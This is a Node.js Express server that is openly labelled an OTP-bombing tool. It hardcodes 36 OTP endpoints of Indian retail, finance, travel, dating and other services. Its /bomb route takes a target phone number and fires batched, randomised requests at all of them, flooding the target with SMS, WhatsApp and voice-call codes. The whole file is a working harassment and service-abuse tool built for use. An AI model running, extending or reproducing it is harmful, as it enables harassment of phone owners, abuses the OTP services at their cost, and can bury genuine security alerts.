// ============================================================
// api_server.js - OTP Bombing API Server (UNTESTED APIs ONLY)
// 36 Untested APIs | 10min Cap | Logs | Delay
// ============================================================

const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

const MAX_DURATION_MIN = 10;
const BATCH_DELAY_MS = 100;
const API_DELAY_MS = 50;

const APIS = [
    {
        name: "Myntra_Voice",
        url: "https://www.myntra.com/gw/mobile-auth/voice-otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ mobile: phone }),
        type: "call"
    },
    {
        name: "Flipkart_Voice",
        url: "https://www.flipkart.com/api/6/user/voice-otp/generate",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ mobile: phone }),
        type: "call"
    },
    {
        name: "Amazon_Voice",
        url: "https://www.amazon.in/ap/signin",
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        data: { "_raw": "phone={phone}&action=voice_otp" },
        type: "call"
    },
    {
        name: "IRCTC_Call",
        url: "https://www.irctc.co.in/api/v1/voice-otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ mobile: phone }),
        type: "call"
    },
    {
        name: "PhonePe_Call",
        url: "https://www.phonepe.com/api/v1/voice-otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ mobile: phone }),
        type: "call"
    },
    {
        name: "Google_Voice",
        url: "https://accounts.google.com/v1/voice-otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ phone: phone }),
        type: "call"
    },
    {
        name: "Stratzy_WhatsApp",
        url: "https://stratzy.in/api/web/whatsapp/sendOTP",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ phoneNo: phone }),
        type: "whatsapp"
    },
    {
        name: "Jockey_WhatsApp_Resend",
        url: "https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{phone}?whatsapp=true",
        method: "GET",
        headers: { "accept": "*/*" },
        type: "whatsapp"
    },
    {
        name: "Eka_Care_WhatsApp",
        url: "https://auth.eka.care/auth/init",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ payload: { allowWhatsapp: true, mobile: "+91" + phone }, type: "mobile" }),
        type: "whatsapp"
    },
    {
        name: "Rapido_WhatsApp",
        url: "https://app.rapido.bike/api/v3/otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ phone: "+91" + phone, channel: "whatsapp" }),
        type: "whatsapp"
    },
    {
        name: "Country_Delight_WhatsApp",
        url: "https://api.countrydelight.in/api/v1/customer/requestOtp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ mobile: phone, platform: "Android", mode: "new_user", channel: "whatsapp" }),
        type: "whatsapp"
    },
    {
        name: "Croma",
        url: "https://api.croma.com/otp/generate",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ phone: phone }),
        type: "sms"
    },
    {
        name: "Reliance_Digital",
        url: "https://www.reliancedigital.in/api/otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ mobile: phone }),
        type: "sms"
    },
    {
        name: "FirstCry",
        url: "https://www.firstcry.com/api/sendotp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ mobile: phone }),
        type: "sms"
    },
    {
        name: "Meru_Cab",
        url: "https://merucabapp.com/api/otp/generate",
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        data: { "_raw": "mobile_number={phone}" },
        type: "sms"
    },
    {
        name: "BeepKart",
        url: "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ phone: phone, city: 362 }),
        type: "sms"
    },
    {
        name: "Dayco_India",
        url: "https://ekyc.daycoindia.com/api/nscript_functions.php",
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        data: { "_raw": "api=send_otp&mob={phone}" },
        type: "sms"
    },
    {
        name: "CaratLane",
        url: "https://www.caratlane.com/cg/dhevudu",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ query: `mutation {SendOtp(input: {mobile: "${phone}"}) {status}}` }),
        type: "sms"
    },
    {
        name: "RummyCircle",
        url: "https://www.rummycircle.com/api/fl/auth/v3/getOtp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ mobile: phone }),
        type: "sms"
    },
    {
        name: "My11Circle",
        url: "https://www.my11circle.com/api/fl/auth/v3/getOtp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ mobile: phone }),
        type: "sms"
    },
    {
        name: "TrulyMadly",
        url: "https://app.trulymadly.com/api/auth/mobile/v1/send-otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ mobile: phone }),
        type: "sms"
    },
    {
        name: "BetterHalf",
        url: "https://api.betterhalf.ai/v2/auth/otp/send/",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ mobile: phone }),
        type: "sms"
    },
    {
        name: "Mpokket",
        url: "https://web-api.mpokket.in/registration/sendOtp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ mobile: phone }),
        type: "sms"
    },
    {
        name: "Justdial",
        url: "https://api.justdial.com/otp/send",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ mobile: phone }),
        type: "sms"
    },
    {
        name: "PolicyBazaar",
        url: "https://api.policybazaar.com/v2/otp/send",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ phone: phone }),
        type: "sms"
    },
    {
        name: "Groww",
        url: "https://api.groww.in/v1/otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ phone: phone }),
        type: "sms"
    },
    {
        name: "Upstox",
        url: "https://api.upstox.com/v1/otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ phone: phone }),
        type: "sms"
    },
    {
        name: "Angel_One",
        url: "https://api.angelone.com/otp/send",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ mobile: phone }),
        type: "sms"
    },
    {
        name: "TooToo",
        url: "https://tootoo.in/graphql",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({
            query: `query sendOtp($mobile_no: String!) { sendOtp(mobile_no: $mobile_no) { success } }`,
            variables: { mobile_no: phone }
        }),
        type: "sms"
    },
    {
        name: "Bella_Vita",
        url: "https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber=%2B91{phone}",
        method: "GET",
        headers: { "accept": "*/*" },
        type: "sms"
    },
    {
        name: "Clovia",
        url: "https://www.clovia.com/api/v4/signup/check-existing-user/?phone={phone}",
        method: "GET",
        headers: { "accept": "*/*" },
        type: "sms"
    },
    {
        name: "Ixigo",
        url: "https://www.ixigo.com/api/v5/oauth/dual/mobile/send-otp",
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded",
            "apikey": "ixiweb\\u00212$",
            "clientid": "ixiweb"
        },
        data: { "_raw": "phone={phone}" },
        type: "sms"
    },
    {
        name: "Beyoung",
        url: "https://www.beyoung.in/api/sendOtp.json",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ username: phone, username_type: "mobile" }),
        type: "sms"
    },
    {
        name: "Wooden_Street",
        url: "https://www.woodenstreet.com/index.php?route=account/forgotten_popup",
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        data: { "_raw": "telephone={phone}" },
        type: "sms"
    },
    {
        name: "GoMechanic",
        url: "https://gomechanic.app/api/v2/send_otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ number: phone, source: "website" }),
        type: "sms"
    },
    {
        name: "GoPink_Cabs",
        url: "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php",
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8" },
        data: { "_raw": "check_mobile_number=1&contact={phone}" },
        type: "sms"
    }
];

console.log(`✅ Loaded ${APIS.length} UNTESTED APIs`);
console.log(`   📞 CALL: ${APIS.filter(a => a.type === 'call').length}`);
console.log(`   💬 WhatsApp: ${APIS.filter(a => a.type === 'whatsapp').length}`);
console.log(`   📱 SMS: ${APIS.filter(a => a.type === 'sms').length}`);
console.log(`⏱️  Max duration cap: ${MAX_DURATION_MIN} minutes`);
console.log(`⏳ API delay: ${API_DELAY_MS}ms | Batch delay: ${BATCH_DELAY_MS}ms`);

function makeFallbackData(phone, apiName) {
    const lower = apiName.toLowerCase();
    if (lower.includes('voice') || lower.includes('call')) {
        return JSON.stringify({ mobile: phone });
    }
    if (lower.includes('whatsapp')) {
        return JSON.stringify({ mobile: phone, channel: "whatsapp" });
    }
    return JSON.stringify({ mobile: phone });
}

async function makeApiCall(api, phone, retryCount = 0) {
    const startTime = Date.now();
    try {
        let url = api.url;
        if (typeof url === 'function') url = url(phone);
        else if (url.includes('{phone}')) url = url.replace(/{phone}/g, phone);

        const headers = { ...api.headers };
        delete headers['content-length'];
        delete headers['Content-Length'];
        delete headers['host'];
        delete headers['Host'];

        let data = null;
        let isRaw = false;

        if (api.data) {
            if (typeof api.data === 'function') {
                data = api.data(phone);
            } else if (api.data._raw) {
                let rawData = api.data._raw;
                if (typeof rawData === 'string') {
                    rawData = rawData.replace(/{phone}/g, phone);
                }
                data = rawData;
                isRaw = true;
            } else {
                data = JSON.parse(JSON.stringify(api.data));
                const replacePhone = (obj) => {
                    if (typeof obj === 'string') return obj.replace(/{phone}/g, phone);
                    if (Array.isArray(obj)) return obj.map(replacePhone);
                    if (typeof obj === 'object' && obj !== null) {
                        const newObj = {};
                        for (let key in obj) {
                            newObj[key] = replacePhone(obj[key]);
                        }
                        return newObj;
                    }
                    return obj;
                };
                data = replacePhone(data);
            }
        } else {
            data = makeFallbackData(phone, api.name);
        }

        const method = api.method.toLowerCase();
        const config = {
            method,
            url,
            headers,
            timeout: 5000,
        };

        if (method === 'post' || method === 'put') {
            if (isRaw || typeof data === 'string') {
                config.data = data;
                if (typeof data === 'string' && data.includes('=') && !data.startsWith('{')) {
                    headers['Content-Type'] = 'application/x-www-form-urlencoded';
                }
            } else {
                config.data = JSON.stringify(data);
                if (!headers['Content-Type']) {
                    headers['Content-Type'] = 'application/json';
                }
            }
        }

        const response = await axios(config);
        const responseTime = Date.now() - startTime;
        return { status: response.status, success: true, responseTime };
    } catch (err) {
        const responseTime = Date.now() - startTime;

        if (retryCount < 1 &&
            (err.code === 'ECONNRESET' || err.code === 'ETIMEDOUT' || err.code === 'ECONNABORTED')) {
            return makeApiCall(api, phone, retryCount + 1);
        }

        let statusCode = null;
        if (err.response) statusCode = err.response.status;

        return { status: statusCode, success: false, responseTime };
    }
}

app.get('/', (req, res) => {
    res.json({
        status: 'ok',
        instance: process.env.INSTANCE_NAME || 'api',
        total_apis: APIS.length,
        call_apis: APIS.filter(a => a.type === 'call').length,
        whatsapp_apis: APIS.filter(a => a.type === 'whatsapp').length,
        sms_apis: APIS.filter(a => a.type === 'sms').length,
        max_duration_min: MAX_DURATION_MIN,
        api_delay_ms: API_DELAY_MS,
        uptime: process.uptime()
    });
});

app.post('/bomb', async (req, res) => {
    const { phone, duration, instance } = req.body;

    if (!phone || phone.length !== 10) {
        return res.status(400).json({ error: 'Invalid phone number. Must be 10 digits.' });
    }

    const requestedDuration = Number(duration) || 1;
    const effectiveDuration = Math.min(requestedDuration, MAX_DURATION_MIN);

    console.log(`\n📱 Bombing ${phone} | Requested: ${requestedDuration}min | Effective: ${effectiveDuration}min | Instance: ${instance || 'default'}`);
    console.log(`🧪 Testing ${APIS.length} UNTESTED APIs...`);

    try {
        const startTime = Date.now();
        let success = 0, smsCount = 0, callCount = 0, whatsappCount = 0;
        const apiList = APIS;
        const BATCH_SIZE = 5;

        let maxRequests = 100;
        if (effectiveDuration <= 1) maxRequests = 200;
        else if (effectiveDuration <= 5) maxRequests = 150;
        else if (effectiveDuration <= 10) maxRequests = 100;
        else maxRequests = 80;

        const shuffled = [...apiList];
        for (let i = shuffled.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1));
            [shuffled[i], shuffled[j]] = [shuffled[j], shuffled[i]];
        }

        let sent = 0;
        for (let i = 0; i < shuffled.length && sent < maxRequests; i += BATCH_SIZE) {
            const batch = shuffled.slice(i, Math.min(i + BATCH_SIZE, shuffled.length));

            const results = await Promise.allSettled(
                batch.map(api => makeApiCall(api, phone))
            );

            for (let k = 0; k < results.length; k++) {
                const result = results[k];
                const api = batch[k];

                if (result.status === 'fulfilled' && result.value && result.value.success) {
                    success++;
                    sent++;
                    const apiName = api.name || '';
                    const isCall = api.type === 'call' || apiName.toLowerCase().includes('call') || apiName.toLowerCase().includes('voice');
                    const isWhatsapp = api.type === 'whatsapp' || apiName.toLowerCase().includes('whatsapp');
                    const type = isCall ? 'CALL' : (isWhatsapp ? 'WA' : 'SMS');

                    console.log(`  ✅ [${success}] ${apiName} → ${result.value.status} (${result.value.responseTime}ms) [${type}]`);

                    if (isCall) callCount++;
                    else if (isWhatsapp) whatsappCount++;
                    else smsCount++;
                } else {
                    const apiName = api.name || '';
                    const status = result.value?.status || 'FAIL';
                    const responseTime = result.value?.responseTime || 0;
                    console.log(`  ❌ ${apiName} → ${status} (${responseTime}ms)`);
                }
            }

            if (i + BATCH_SIZE < shuffled.length && sent < maxRequests) {
                await new Promise(r => setTimeout(r, BATCH_DELAY_MS));
            }
        }

        const elapsed = (Date.now() - startTime) / 1000;

        console.log(`✅ Bombing ${phone} done | Sent: ${success} | SMS: ${smsCount} | Calls: ${callCount} | WA: ${whatsappCount} | ${elapsed.toFixed(1)}s\n`);

        res.json({
            success: true,
            phone,
            requested_duration: requestedDuration,
            effective_duration: effectiveDuration,
            instance: instance || 'default',
            totalSent: success,
            sms: smsCount,
            calls: callCount,
            whatsapp: whatsappCount,
            elapsed: elapsed.toFixed(1) + 's',
            total_apis: APIS.length
        });

    } catch (error) {
        console.error('Bombing error:', error);
        res.status(500).json({ error: error.message });
    }
});

app.get('/apis', (req, res) => {
    res.json({
        total: APIS.length,
        call_apis: APIS.filter(a => a.type === 'call').map(a => a.name),
        whatsapp_apis: APIS.filter(a => a.type === 'whatsapp').map(a => a.name),
        sms_apis: APIS.filter(a => a.type === 'sms').map(a => a.name),
        max_duration_min: MAX_DURATION_MIN,
        api_delay_ms: API_DELAY_MS,
        instances: process.env.INSTANCE_NAME || 'api'
    });
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 API Server running on port ${PORT}`);
    console.log(`📡 Instance: ${process.env.INSTANCE_NAME || 'default'}`);
    console.log(`📊 Untested APIs Loaded: ${APIS.length}`);
    console.log(`   📞 CALL: ${APIS.filter(a => a.type === 'call').length}`);
    console.log(`   💬 WhatsApp: ${APIS.filter(a => a.type === 'whatsapp').length}`);
    console.log(`   📱 SMS: ${APIS.filter(a => a.type === 'sms').length}`);
    console.log(`⏱️  Max duration: ${MAX_DURATION_MIN} minutes (highest cap)`);
    console.log(`⏳ API delay: ${API_DELAY_MS}ms`);
    console.log(`⏳ Batch delay: ${BATCH_DELAY_MS}ms`);
});
